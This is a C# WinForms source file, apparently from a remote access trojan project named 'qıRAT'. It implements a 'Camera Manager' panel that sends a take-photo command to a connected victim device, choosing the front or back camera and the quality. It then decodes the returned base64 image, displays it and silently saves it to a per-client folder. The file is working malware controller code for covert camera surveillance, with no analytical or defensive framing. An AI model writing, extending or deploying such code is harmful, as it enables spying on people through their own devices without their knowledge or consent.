using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace qıRAT
{
    public partial class cameraform : Form
    {
        private string deviceID;
        private DeviceInfo currentDevice;



        public cameraform(string devID)
        {
            InitializeComponent();
            this.MaximizeBox = false;
            this.deviceID = devID;
            

            this.currentDevice = socket.GetDeviceInfo(deviceID);
            

            socket.PhotoReceived += Socket_PhotoReceived;
            this.Load += Cameraform_Load;
            this.FormClosing += Cameraform_FormClosing;
        }

        public cameraform()
        {
            InitializeComponent();
        }

        private void Cameraform_Load(object sender, EventArgs e)
        {
            if (currentDevice != null)
            {
                this.Text = "Camera Manager - " + currentDevice.Model;
            }


            if (comboBoxselectcamera != null)
            {
                comboBoxselectcamera.Items.Clear();
                comboBoxselectcamera.Items.Add("Back Camera (0)");
                comboBoxselectcamera.Items.Add("Front Camera (1)");
                comboBoxselectcamera.SelectedIndex = 0;
            }


            if (comboBoxselectquality != null)
            {
                comboBoxselectquality.Items.Clear();
                for (int i = 10; i <= 100; i += 10)
                {
                    comboBoxselectquality.Items.Add(i + "%");
                }

            }


            if (buttonstart != null)
            {

                buttonstart.Click += Buttonstart_Click;
            }
            

            if (buttonrevert != null)
            {
                buttonrevert.Click -= Buttonrevert_Click;
                buttonrevert.Click += Buttonrevert_Click;
            }
        }

        private void Buttonstart_Click(object sender, EventArgs e)
        {
            if (currentDevice == null) return;


            int camId = comboBoxselectcamera.SelectedIndex;
            string qualityStr = comboBoxselectquality.SelectedItem.ToString().Replace("%", "");
            int quality = int.Parse(qualityStr);

            socket.SendData(currentDevice.Client, $"takePic:{camId}:{quality}");
            

            buttonstart.Text = "Taking Photo...";
            buttonstart.Enabled = false;
            

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 2000;
            timer.Tick += (s, args) => {
                buttonstart.Text = "Take Photo";
                buttonstart.Enabled = true;
                timer.Stop();
            };
            timer.Start();
        }

        private void Socket_PhotoReceived(object sender, Tuple<DeviceInfo, string> e)
        {

            if (currentDevice == null || e.Item1.DeviceID != deviceID) return;

            try
            {
                string json = e.Item2;
                

                var match = System.Text.RegularExpressions.Regex.Match(json, "\"image\"\\s*:\\s*\"([^\"]+)\"");
                
                if (match.Success)
                {
                    string base64 = match.Groups[1].Value;
                    


                    base64 = base64.Replace("\\/", "/");

                    base64 = base64.Replace("\\", "");

                    base64 = base64.Replace("\n", "").Replace("\r", "");
                    
                    byte[] imageBytes = Convert.FromBase64String(base64);
                    
                    using (MemoryStream ms = new MemoryStream(imageBytes))
                    {
                        Image img = Image.FromStream(ms);
                        

                        try 
                        {
                            string saveDir;
                            


                            if (currentDevice != null && !string.IsNullOrEmpty(currentDevice.FolderPath))
                            {
                                saveDir = currentDevice.FolderPath;
                            }
                            else
                            {

                                saveDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "client", deviceID);
                            }

                            if (!Directory.Exists(saveDir))
                            {
                                Directory.CreateDirectory(saveDir);
                            }
                            
                            string fileName = $"Camera_{DateTime.Now:yyyyMMdd_HHmmss}_{Guid.NewGuid().ToString().Substring(0, 4)}.png";
                            string savedFile = Path.Combine(saveDir, fileName);
                            

                            img.Save(savedFile, System.Drawing.Imaging.ImageFormat.Png);
                        }
                        catch (Exception saveEx)
                        {
                            System.Diagnostics.Debug.WriteLine($"Auto-save failed: {saveEx.Message}");
                        }
                         

                        if (pictureBoxcamera != null && !pictureBoxcamera.IsDisposed)
                        {
                            pictureBoxcamera.BeginInvoke((MethodInvoker)delegate {

                                if (pictureBoxcamera.Image != null) pictureBoxcamera.Image.Dispose();
                                

                                pictureBoxcamera.Image = new Bitmap(img);
                                pictureBoxcamera.SizeMode = PictureBoxSizeMode.Zoom;
                            });
                        }
                    }
                }
                else
                {

                    MessageBox.Show("Regex match failed. Data len: " + json.Length); 
                }
            }
            catch (Exception ex)
            {

                 MessageBox.Show("Error on photo: " + ex.Message);
            }
        }

        private void Buttonrevert_Click(object sender, EventArgs e)
        {

            if (pictureBoxcamera != null && pictureBoxcamera.Image != null)
            {
                try
                {

                    Image currentImage = (Image)pictureBoxcamera.Image.Clone();
                    

                    currentImage.RotateFlip(RotateFlipType.Rotate90FlipNone);
                    

                    pictureBoxcamera.Image.Dispose();
                    

                    pictureBoxcamera.Image = currentImage;
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error rotating image: {ex.Message}");
                }
            }
        }

        private void Cameraform_FormClosing(object sender, FormClosingEventArgs e)
        {


            socket.PhotoReceived -= Socket_PhotoReceived;
        }
    }
}
